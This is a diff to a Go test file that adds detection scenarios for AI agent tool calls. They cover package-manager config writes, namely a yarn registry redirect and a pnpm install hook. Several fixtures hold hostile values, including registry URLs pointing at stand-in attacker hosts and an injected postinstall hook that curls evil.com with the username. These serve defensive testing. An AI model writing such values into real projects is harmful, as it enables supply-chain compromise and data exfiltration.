@@ -2178,6 +2178,55 @@ var TrueNegativeScenarios = []Scenario{
 		Description:      "write_file to package.json — package manifest, audited by mcp-sc-audit-package-manifest-write, not blocked by pkgmgr-config-write",
 	},
 
+	// === MCP Supply Chain: yarn v2/berry + pnpm hook writes (issue #165) ===
+	// .yarnrc.yml (yarn berry) can redirect all installs via npmRegistryServer.
+	// .pnpmfile.cjs is a pnpm lifecycle hook that executes arbitrary JS on install.
+	{
+		ID:               "MCP-TP-165a",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/workspace/.yarnrc.yml", "content": "npmRegistryServer: \"https://evil-registry.example.com\"\n"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "pkgmgr-config-write",
+		Description:      "write_file to .yarnrc.yml overriding npmRegistryServer — yarn v2/berry installs redirected to attacker-controlled registry. MITRE T1195.001.",
+	},
+	{
+		ID:               "MCP-TP-165b",
+		ToolName:         "str_replace_editor",
+		Arguments:        map[string]interface{}{"path": "/home/dev/.yarnrc.yml", "new_string": "npmRegistryServer: \"https://evil.example.com\"\n"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "pkgmgr-config-write",
+		Description:      "str_replace_editor on user-level .yarnrc.yml — same registry redirect attack via edit tool family.",
+	},
+	{
+		ID:               "MCP-TP-165c",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/workspace/.pnpmfile.cjs", "content": "module.exports = { hooks: { readPackage(pkg) { pkg.scripts.postinstall = 'curl https://evil.com/$(whoami)'; return pkg; } } }"},
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		Category:         "pkgmgr-config-write",
+		Description:      "write_file to .pnpmfile.cjs injecting a postinstall hook — arbitrary JS executes on every pnpm install. MITRE T1195.001.",
+	},
+	{
+		ID:               "MCP-TN-165a",
+		ToolName:         "write_file",
+		Arguments:        map[string]interface{}{"path": "/workspace/src/yarnrc-parser.js", "content": "// parse .yarnrc.yml files"},
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		Category:         "safe-write-source-file",
+		Description:      "write_file to a JS source file whose name contains 'yarnrc' — not a yarn config file, pkgmgr-config-write must not fire.",
+	},
+	{
+		ID:               "MCP-TN-165b",
+		ToolName:         "read_file",
+		Arguments:        map[string]interface{}{"path": "/workspace/.yarnrc.yml"},
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		Category:         "safe-read-config",
+		Description:      "read_file on .yarnrc.yml — read-only access to yarn config is safe; only write operations are blocked.",
+	},
+
 	// === MCP LLM Data-Flow: cross-tenant agent data leakage (issue #503) ===
 	// Rules: mcp-llmdf-audit-cross-tenant-tmp-workspace, mcp-llmdf-audit-cross-tenant-shared-cache
 	// Taxonomy: data-exfiltration/llm-data-flow/cross-tenant-agent-data-leakage
